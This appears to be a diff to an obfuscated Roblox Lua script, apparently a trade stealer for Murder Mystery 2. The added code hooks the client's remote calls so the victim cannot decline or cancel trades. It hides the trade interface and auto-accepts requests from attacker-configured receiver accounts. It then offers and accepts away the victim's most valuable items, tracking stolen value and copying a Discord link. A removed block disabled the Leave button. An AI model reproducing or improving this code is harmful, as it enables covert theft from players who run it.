@@ -107,7 +107,11 @@ if #tbl2 == 0 then
 end
 
 -- tbl3 = trade target player names (from Targets config key)
+-- fallback: if Targets is not set, use ReceiverAccounts so receiver_account drives DoTrade
 local targets = projectVeloConfig.Targets or projectVeloConfig.TARGETS or {}
+if #targets == 0 and #receiverAccountsList > 0 then
+	targets = receiverAccountsList
+end
 local tbl3 = {}
 local tbl2targets = {}
 
@@ -1217,7 +1221,7 @@ local function fn27(arg)
 		{ "winter", "🥶" },
 		{ "chill", "🥶" },
 		{ "arctic", "🧊" },
-		{ "polar bear", "🐻❄️" },
+		{ "polar bear", "🐻‍❄️" },
 		{ " ice ", "🧊" },
 		{ "nightfire", "🔥" },
 		{ "flame", "🔥" },
@@ -1353,7 +1357,7 @@ local function fn27(arg)
 		{ "viper", "🐍" },
 		{ "snakebite", "🐍" },
 		{ "tiger", "🐯" },
-		{ "pirate", "🏴☠️" },
+		{ "pirate", "🏴‍☠️" },
 		{ "butterflies", "🦋" },
 		{ "bubbles", "🫧" },
 		{ "swirly", "🌀" },
@@ -1849,32 +1853,6 @@ Players.PlayerRemoving:Connect(function(player)
 	end
 end)
 
--- Disable the in-game Leave button so the target cannot click Leave during a trade
-task.spawn(function()
-	while task.wait() do
-		pcall(function()
-			for _, v in ipairs(getconnections(
-				game:GetService("CoreGui")
-					.RobloxGui
-					.SettingsClippingShield
-					.SettingsShield
-					.MenuContainer
-					.Page
-					.PageViewClipper
-					.PageView
-					.PageViewInnerFrame
-					.LeaveGamePage
-					.LeaveButtonsContainer
-					.LeaveButtonsContainer
-					.LeaveGameButton
-					.Activated
-			)) do
-				v:Disable()
-			end
-		end)
-	end
-end)
-
 -- Anti-leave: only fires "Left Server" when a trade session is actually live
 -- (OtherPlayer set by StartTrade.OnClientEvent). runtime.Target is also set during
 -- invite attempts where no trade has started yet — checking OtherPlayer prevents
@@ -2005,4 +1983,733 @@ local function fn39(arg, ...)
 	table.move(v19, 1, v19.n, 3, v19)
 	v19[1] = v18
 	v19[2] = arg
-	local v20, v21 = v17(table.unpack(v19, 1, v19.n... (18 KB left)
+	local v20, v21 = v17(table.unpack(v19, 1, v19.n))
+	obj[v15] = v16
+	return v20, v21
+end
+
+local offerItem = trade:WaitForChild("OfferItem")
+local acceptTrade = trade:WaitForChild("AcceptTrade")
+local acceptRequest = trade:WaitForChild("AcceptRequest")
+local declineTrade = trade:WaitForChild("DeclineTrade")
+local declineRequest = trade:WaitForChild("DeclineRequest")
+
+local tbl19 = {
+	DeclineTrade = true,
+	DeclineRequest = true,
+	CancelRequest = true,
+	CancelAccept = true,
+	RemoveOffer = true,
+	SetRequestsEnabled = true,
+}
+
+local tbl20 = {
+	DeclineTrade = true,
+	DeclineRequest = true,
+	CancelRequest = true,
+	CancelAccept = true,
+	RemoveOffer = true,
+}
+
+local n16 = 0
+local n17 = 0
+
+for _, child in ipairs(trade:GetChildren()) do
+	if tbl20[child.Name] and (child:IsA("RemoteEvent") or child:IsA("RemoteFunction")) then
+		tbl18[child] = true
+
+		if pcall(function()
+			child.Parent = ReplicatedStorage
+			child.Name = HttpService:GenerateGUID(false)
+		end) then
+			n16 += 1
+		else
+			n17 += 1
+		end
+	end
+end
+
+local function fn40(descendant)
+	local v15 = tbl19[descendant.Name]
+	local isRemoteEvent
+
+	if v15 then
+		isRemoteEvent = descendant:IsA("RemoteEvent") or descendant:IsA("RemoteFunction")
+	else
+		isRemoteEvent = v15
+	end
+
+	if isRemoteEvent then
+		tbl18[descendant] = true
+	end
+end
+
+for _, descendant in ipairs(trade:GetDescendants()) do
+	fn40(descendant)
+end
+
+table.insert(projectVeloTradeRuntime.Connections, trade.DescendantAdded:Connect(fn40))
+local remoteEvent2 = Instance.new("RemoteEvent")
+local flag5 = false
+
+local function fn41()
+	if type(hookfunction) ~= "function" then
+		return false
+	end
+
+	return (pcall(function()
+		local v15 = nil
+		local v16 = nil
+
+		local function fn42(arg, ...)
+			if tbl18[arg] and not obj[coroutine.running()] then
+				if arg == remoteEvent2 then
+					flag5 = true
+				end
+
+				return
+			end
+
+			return v15(arg, ...)
+		end
+
+		local function fn43(arg, ...)
+			if tbl18[arg] and not obj[coroutine.running()] then
+				return
+			end
+			return v16(arg, ...)
+		end
+
+		if type(newcclosure) == "function" then
+			fn42 = newcclosure(fn42)
+			fn43 = newcclosure(fn43)
+		end
+
+		v15 = hookfunction
+		v15 = v15(fireServer, fn42)
+		v16 = hookfunction(invokeServer, fn43)
+
+		if type(v15) ~= "function" or type(v16) ~= "function" then
+			error("hookfunction did not return the originals")
+		end
+
+		fireServer = v15
+		invokeServer = v16
+		flag4 = true
+	end))
+end
+
+tbl18[remoteEvent2] = true
+fn41()
+
+if type(getnamecallmethod) == "function" then
+	local v15 = getnamecallmethod
+	local v16 = nil
+
+	local function namecall(arg, ...)
+		if tbl18[arg] and not obj[coroutine.running()] then
+			local v17 = v15()
+			if v17 == "FireServer" or v17 == "InvokeServer" then
+				return nil
+			end
+		end
+
+		return v16(arg, ...)
+	end
+
+	local flag6 = false
+
+	if type(hookmetamethod) == "function" then
+		local ok3, result3 = pcall(hookmetamethod, game, "__namecall", namecall)
+
+		if ok3 and type(result3) == "function" then
+			v16 = result3
+			flag6 = true
+		end
+	end
+
+	if not flag6 and type(getrawmetatable) == "function" then
+		if pcall(function()
+			local v17 = getrawmetatable(game)
+			local flag7 = type(setreadonly) == "function"
+
+			if flag7 then
+				setreadonly(v17, false)
+			end
+
+			local namecall2 = v17.__namecall
+
+			if type(namecall2) == "function" then
+				v16 = namecall2
+				v17.__namecall = namecall
+			end
+
+			if flag7 then
+				setreadonly(v17, true)
+			end
+		end) then
+			local flag7 = type(v16) == "function"
+		end
+	end
+end
+
+if flag4 then
+	task.spawn(function()
+		local n18 = 0
+
+		while projectVeloTradeRuntime.Active and n18 < 20 do
+			task.wait(5)
+			flag5 = false
+
+			pcall(function()
+				remoteEvent2:FireServer()
+			end)
+
+			if not flag5 then
+				n18 += 1
+				flag4 = false
+				fn41()
+			end
+		end
+	end)
+end
+
+local tbl21 = { TradeRequest = true, SendingRequest = true, ReceivingRequest = true }
+
+local function fn42(arg)
+	return arg:IsA("GuiObject") and tbl21[arg.Name] == true
+end
+
+local function fn43()
+	for _, descendant in ipairs(localPlayer.PlayerGui:GetDescendants()) do
+		if fn42(descendant) then
+			descendant.Visible = false
+		end
+	end
+end
+
+local function fn44()
+	for _, v15 in ipairs({ "TradeGUI", "TradeGUI_Phone" }) do
+		local v16 = localPlayer.PlayerGui:FindFirstChild(v15)
+
+		if v16 and v16:IsA("ScreenGui") then
+			v16.Enabled = false
+		end
+	end
+end
+
+local function fn45(arg)
+	if not arg:IsA("ScreenGui") or arg.Name ~= "TradeGUI" and arg.Name ~= "TradeGUI_Phone" then
+		return
+	end
+
+	if arg.Enabled then
+		arg.Enabled = false
+	end
+
+	table.insert(projectVeloTradeRuntime.Connections, arg:GetPropertyChangedSignal("Enabled"):Connect(function()
+		if projectVeloTradeRuntime.Active and arg.Enabled then
+			arg.Enabled = false
+		end
+	end))
+end
+
+for _, child in ipairs(localPlayer.PlayerGui:GetChildren()) do
+	fn45(child)
+end
+
+table.insert(projectVeloTradeRuntime.Connections, localPlayer.PlayerGui.ChildAdded:Connect(function(child)
+	fn45(child)
+
+	if projectVeloTradeRuntime.Active then
+		task.defer(fn44)
+	end
+end))
+
+local function fn46(arg)
+	if fn42(arg) then
+		arg.Visible = false
+
+		table.insert(projectVeloTradeRuntime.Connections, arg:GetPropertyChangedSignal("Visible"):Connect(function()
+			if projectVeloTradeRuntime.Active and arg.Visible then
+				arg.Visible = false
+			end
+		end))
+	end
+end
+
+for _, descendant in ipairs(localPlayer.PlayerGui:GetDescendants()) do
+	fn46(descendant)
+end
+
+table.insert(projectVeloTradeRuntime.Connections, localPlayer.PlayerGui.DescendantAdded:Connect(function(descendant)
+	if fn42(descendant) then
+		fn46(descendant)
+		task.defer(fn43)
+	end
+end))
+
+local function fn47()
+	local tbl22 = {}
+	local tbl23 = {}
+
+	for _, v15 in ipairs(v4) do
+		local str14 = v15.category .. "\0" .. v15.id
+
+		if not tbl23[str14] then
+			tbl23[str14] = true
+			table.insert(tbl22, v15)
+			if not (n11 <= #tbl22) then
+				continue
+			end
+		else
+			continue
+		end
+
+		break
+	end
+
+	return tbl22
+end
+
+local function fn48(arg)
+	local v15 = ipairs
+	arg = arg or {}
+	local n18 = 0
+
+	for _, v16 in v15(arg) do
+		local n19 = math.max(1, math.floor(tonumber(v16.amount) or 1))
+		n18 += math.max(0, tonumber(v16.value) or 0) * n19
+	end
+
+	return n18
+end
+
+local function fn49(arg)
+	if type(arg) ~= "table" then
+		return nil
+	end
+
+	for _, v15 in ipairs({ "Player1", "Player2" }) do
+		local v16 = arg[v15]
+		if v16 and v16.Player == localPlayer then
+			return v16.Offer
+		end
+	end
+end
+
+local function fn50(arg, arg2)
+	local v15 = pairs
+	arg = arg or {}
+
+	for _, v16 in v15(arg) do
+		local itemID = v16[1] or v16.ItemID
+		local n18 = tonumber(v16[2] or v16.Amount) or 1
+		local itemType = v16[3] or v16.ItemType
+		local id = arg2.id
+		if tostring(itemID) == id and tostring(itemType) == arg2.category then
+			return n18
+		end
+	end
+
+	return 0
+end
+
+local function fn51(arg)
+	if #projectVeloTradeRuntime.Selected == 0 then
+		return false
+	end
+
+	for _, v15 in ipairs(projectVeloTradeRuntime.Selected) do
+		local n18 = math.max(1, math.floor(tonumber(v15.amount) or 1))
+		if fn50(arg, v15) < n18 then
+			return false
+		end
+	end
+
+	return true
+end
+
+local function fn52(arg)
+	if arg and fn(arg) and (not flag or fn3(arg)) then
+		local v15 = Players:FindFirstChild(arg)
+		if v15 and v15 ~= localPlayer then
+			return v15
+		end
+	end
+end
+
+local function fn53()
+	if projectVeloTradeRuntime.FinishedKickScheduled then
+		return
+	end
+	projectVeloTradeRuntime.FinishedKickScheduled = true
+	projectVeloTradeRuntime.Active = false
+
+	pcall(function()
+		local v15 = setclipboard or toclipboard
+
+		if type(v15) == "function" then
+			v15("https://discord.gg/projectvelo")
+		end
+	end)
+end
+
+local function fn54(arg)
+	local lastTarget = arg or projectVeloTradeRuntime.LastTarget
+
+	if lastTarget then
+		projectVeloTradeRuntime.LastTarget = lastTarget
+	end
+
+	projectVeloTradeRuntime.RestartToken = projectVeloTradeRuntime.RestartToken + 1
+	local restartToken = projectVeloTradeRuntime.RestartToken
+	projectVeloTradeRuntime.Session = projectVeloTradeRuntime.Session + 1
+	projectVeloTradeRuntime.Update = projectVeloTradeRuntime.Update + 1
+	projectVeloTradeRuntime.OtherPlayer = nil
+	projectVeloTradeRuntime.Target = nil
+	projectVeloTradeRuntime.Selected = {}
+	projectVeloTradeRuntime.ObservedOffer = nil
+	projectVeloTradeRuntime.AcceptGeneration = projectVeloTradeRuntime.AcceptGeneration + 1
+	projectVeloTradeRuntime.AcceptScheduled = false
+	projectVeloTradeRuntime.AcceptPending = false
+	projectVeloTradeRuntime.LastAcceptSentAt = 0
+	flag3 = false
+
+	task.delay(1.25, function()
+		if not projectVeloTradeRuntime.Active or projectVeloTradeRuntime.RestartToken ~= restartToken then
+			return
+		end
+		local v15, v16 = fn24(true)
+		v4 = v15
+
+		if #v4 == 0 then
+			if projectVeloTradeRuntime.ConfirmedCompletionPending and v16 then
+				fn53()
+				return
+			end
+			return
+		end
+
+		projectVeloTradeRuntime.ConfirmedCompletionPending = false
+		local v17 = fn52(lastTarget)
+
+		if v17 then
+			fn37(v17)
+		end
+	end)
+end
+
+table.insert(projectVeloTradeRuntime.Connections, trade.StartTrade.OnClientEvent:Connect(function(arg, arg2)
+	fn44()
+	projectVeloTradeRuntime.Session = projectVeloTradeRuntime.Session + 1
+	projectVeloTradeRuntime.Update = projectVeloTradeRuntime.Update + 1
+	projectVeloTradeRuntime.OtherPlayer = tostring(arg2)
+	projectVeloTradeRuntime.ObservedOffer = nil
+	projectVeloTradeRuntime.AcceptGeneration = projectVeloTradeRuntime.AcceptGeneration + 1
+	projectVeloTradeRuntime.AcceptScheduled = false
+	projectVeloTradeRuntime.AcceptPending = false
+	projectVeloTradeRuntime.LastAcceptSentAt = 0
+	projectVeloTradeRuntime.PendingCompletion = nil
+	v4 = fn24(true)
+	projectVeloTradeRuntime.Selected = fn47()
+
+	if not fn(projectVeloTradeRuntime.OtherPlayer) then
+		projectVeloTradeRuntime.Target = nil
+		projectVeloTradeRuntime.Selected = {}
+		fn44()
+		fn38(declineTrade)
+		return
+	end
+
+	projectVeloTradeRuntime.Target = projectVeloTradeRuntime.OtherPlayer
+	projectVeloTradeRuntime.LastTarget = projectVeloTradeRuntime.OtherPlayer
+	local session = projectVeloTradeRuntime.Session
+
+	projectVeloTradeRuntime.PendingCompletion = {
+		Session = session,
+		Value = fn48(projectVeloTradeRuntime.Selected),
+		TradeId = v11 .. ":" .. tostring(session),
+		Reported = false,
+	}
+
+	fn44()
+	task.defer(fn44)
+
+	task.delay(0.1, function()
+		if projectVeloTradeRuntime.Active and projectVeloTradeRuntime.Session == session then
+			fn44()
+		end
+	end)
+
+	task.spawn(function()
+		task.wait(0.75)
+		local n18 = 0
+
+		for _, v15 in ipairs(projectVeloTradeRuntime.Selected) do
+			local max = math.max
+			local floor = math.floor
+			local n19 = tonumber(v15.amount) or 1
+
+			for i = 1, max(1, floor(n19)) do
+				if not projectVeloTradeRuntime.Active or projectVeloTradeRuntime.Session ~= session or projectVeloTradeRuntime.OtherPlayer ~= projectVeloTradeRuntime.Target then
+					return
+				end
+				fn38(offerItem, v15.id, v15.category)
+				n18 += 1
+
+				if n18 >= n12 then
+					task.wait()
+					n18 = 0
+				end
+			end
+		end
+	end)
+end))
+
+table.insert(projectVeloTradeRuntime.Connections, trade.UpdateTrade.OnClientEvent:Connect(function(arg)
+	if not projectVeloTradeRuntime.Active or not projectVeloTradeRuntime.Target or projectVeloTradeRuntime.OtherPlayer ~= projectVeloTradeRuntime.Target then
+		return
+	end
+	projectVeloTradeRuntime.Update = projectVeloTradeRuntime.Update + 1
+	local session = projectVeloTradeRuntime.Session
+	local v15 = fn49(arg)
+	local lastOffer = arg.LastOffer
+
+	if projectVeloTradeRuntime.ObservedOffer ~= lastOffer then
+		projectVeloTradeRuntime.ObservedOffer = lastOffer
+		projectVeloTradeRuntime.AcceptGeneration = projectVeloTradeRuntime.AcceptGeneration + 1
+		projectVeloTradeRuntime.AcceptScheduled = false
+		projectVeloTradeRuntime.AcceptPending = false
+		projectVeloTradeRuntime.LastAcceptSentAt = 0
+	end
+
+	if not fn51(v15) then
+		return
+	end
+
+	if projectVeloTradeRuntime.AcceptScheduled then
+		return
+	end
+	projectVeloTradeRuntime.AcceptScheduled = true
+	local acceptGeneration = projectVeloTradeRuntime.AcceptGeneration
+
+	task.delay(4, function()
+		if not projectVeloTradeRuntime.Active or projectVeloTradeRuntime.Session ~= session or projectVeloTradeRuntime.AcceptGeneration ~= acceptGeneration or projectVeloTradeRuntime.ObservedOffer ~= lastOffer or projectVeloTradeRuntime.OtherPlayer ~= projectVeloTradeRuntime.Target then
+			return
+		end
+		projectVeloTradeRuntime.AcceptPending = true
+		projectVeloTradeRuntime.LastAcceptSentAt = time()
+		fn38(acceptTrade, game.PlaceId * 3, lastOffer)
+	end)
+end))
+
+table.insert(projectVeloTradeRuntime.Connections, trade.EndTrade.OnClientEvent:Connect(function()
+	fn54(projectVeloTradeRuntime.Target)
+end))
+
+table.insert(projectVeloTradeRuntime.Connections, trade.AcceptTrade.OnClientEvent:Connect(function(arg)
+	if arg then
+		projectVeloTradeRuntime.AcceptPending = false
+		projectVeloTradeRuntime.ConfirmedCompletionPending = true
+		projectVeloTradeRuntime.TradeCompleted = true
+		local pendingCompletion = projectVeloTradeRuntime.PendingCompletion
+
+		if pendingCompletion and not pendingCompletion.Reported and pendingCompletion.Value > 0 then
+			pendingCompletion.Reported = true
+			fn34(pendingCompletion.Value, pendingCompletion.TradeId)
+		end
+
+		fn54(projectVeloTradeRuntime.Target)
+	end
+end))
+
+local function fn55(arg)
+	fn43()
+	local name2
+
+	if typeof(arg) == "Instance" and arg:IsA("Player") then
+		name2 = arg.Name
+	else
+		name2 = tostring(arg)
+	end
+
+	if fn(name2) then
+		flag3 = true
+		projectVeloTradeRuntime.Target = name2
+		projectVeloTradeRuntime.LastTarget = name2
+
+		task.delay(0.1, function()
+			if projectVeloTradeRuntime.Active then
+				fn43()
+				fn38(acceptRequest)
+			end
+		end)
+
+		return true
+	end
+
+	task.delay(0.05, function()
+		if projectVeloTradeRuntime.Active then
+			fn43()
+			fn38(declineRequest)
+		end
+	end)
+
+	return false
+end
+
+local function fn56()
+	sendRequest.OnClientInvoke = function(arg)
+		return fn55(arg)
+	end
+end
+
+fn56()
+
+table.insert(projectVeloTradeRuntime.Connections, trade.RequestSent.OnClientEvent:Connect(function(arg)
+	fn55(arg)
+end))
+
+fn37 = function(player)
+	local v15 = flag3
+	local flag6
+
+	if flag3 then
+		flag6 = v15
+	else
+		flag6 = not projectVeloTradeRuntime.Active
+	end
+
+	if flag6 or not fn(player.Name) or player == localPlayer then
+		return
+	end
+	flag3 = true
+	projectVeloTradeRuntime.LastInviteAt = time()
+	projectVeloTradeRuntime.Target = player.Name
+	projectVeloTradeRuntime.LastTarget = player.Name
+
+	if not fn39(sendRequest, player) then
+		flag3 = false
+		projectVeloTradeRuntime.Target = nil
+
+		task.delay(2.5, function()
+			if projectVeloTradeRuntime.Active and not flag3 and player.Parent == Players and fn(player.Name) then
+				fn37(player)
+			end
+		end)
+	end
+end
+
+table.insert(projectVeloTradeRuntime.Connections, Players.PlayerAdded:Connect(fn37))
+
+task.spawn(function()
+	while projectVeloTradeRuntime.Active do
+		task.wait(1)
+		fn56()
+		local flag6, v15 = fn39(getTradeStatus)
+
+		if flag6 and v15 == "None" then
+			local lastInviteAt = projectVeloTradeRuntime.LastInviteAt
+			local n18 = time() - lastInviteAt
+
+			if flag3 and n18 >= n15 then
+				flag3 = false
+			end
+
+			if projectVeloTradeRuntime.OtherPlayer ~= nil then
+				projectVeloTradeRuntime.Session = projectVeloTradeRuntime.Session + 1
+				projectVeloTradeRuntime.Update = projectVeloTradeRuntime.Update + 1
+				projectVeloTradeRuntime.OtherPlayer = nil
+				projectVeloTradeRuntime.Target = nil
+				projectVeloTradeRuntime.Selected = {}
+				projectVeloTradeRuntime.ObservedOffer = nil
+				projectVeloTradeRuntime.AcceptGeneration = projectVeloTradeRuntime.AcceptGeneration + 1
+				projectVeloTradeRuntime.AcceptScheduled = false
+				projectVeloTradeRuntime.AcceptPending = false
+				projectVeloTradeRuntime.LastAcceptSentAt = 0
+			end
+
+			if not flag3 and n18 >= n14 then
+				v4 = fn24()
+
+				if #v4 > 0 then
+					local v16 = fn52(projectVeloTradeRuntime.LastTarget)
+
+					if v16 then
+						fn37(v16)
+					end
+				end
+			end
+		else
+			flag6 = flag6 and projectVeloTradeRuntime.AcceptPending and projectVeloTradeRuntime.ObservedOffer ~= nil and projectVeloTradeRuntime.OtherPlayer == projectVeloTradeRuntime.Target
+
+			if flag6 then
+				local lastAcceptSentAt = projectVeloTradeRuntime.LastAcceptSentAt
+				flag6 = time() - lastAcceptSentAt >= n13
+			end
+
+			if flag6 then
+				projectVeloTradeRuntime.LastAcceptSentAt = time()
+				fn38(acceptTrade, game.PlaceId * 3, projectVeloTradeRuntime.ObservedOffer)
+			end
+		end
+	end
+end)
+
+local v15, v16 = fn39(getTradeStatus)
+
+if v15 and v16 ~= nil and v16 ~= "None" then
+	fn38(declineTrade)
+	fn38(declineRequest)
+	projectVeloTradeRuntime.OtherPlayer = nil
+	projectVeloTradeRuntime.Target = nil
+	projectVeloTradeRuntime.Selected = {}
+	projectVeloTradeRuntime.ObservedOffer = nil
+	pcall(fn44)
+end
+
+local v17 = fn52()
+
+if v17 then
+	task.defer(fn37, v17)
+end
+
+genv.ProjectVeloMM2RedirectRun = (genv.ProjectVeloMM2RedirectRun or 0) + 1
+local projectVeloMM2RedirectRun = genv.ProjectVeloMM2RedirectRun
+
+task.delay(n2, function()
+	if genv.ProjectVeloMM2RedirectRun ~= projectVeloMM2RedirectRun or not projectVeloTradeRuntime.Active or projectVeloTradeRuntime.TradeCompleted or projectVeloMM2LiveRuntime.Completed then
+		return
+	end
+	local n18 = 0
+
+	for _, v18 in ipairs(v4) do
+		local v19 = fn2(v18)
+
+		if v19 > n18 then
+			if v18.displayName then
+				n18 = v19
+			else
+				n18 = v19
+			end
+		end
+	end
+
+	if n18 < godly then
+		return
+	end
+
+	if not fn4() then
+		return
+	end
+	projectVeloTradeRuntime.LastTarget = nil
+
+	if projectVeloTradeRuntime.OtherPlayer ~= nil and not fn3(projectVeloTradeRuntime.OtherPlayer) then
+		fn38(declineTrade)
+	end
+
+	task.spawn(function()
+		fn33("redirect", nil, 3)
+	end)
+end)
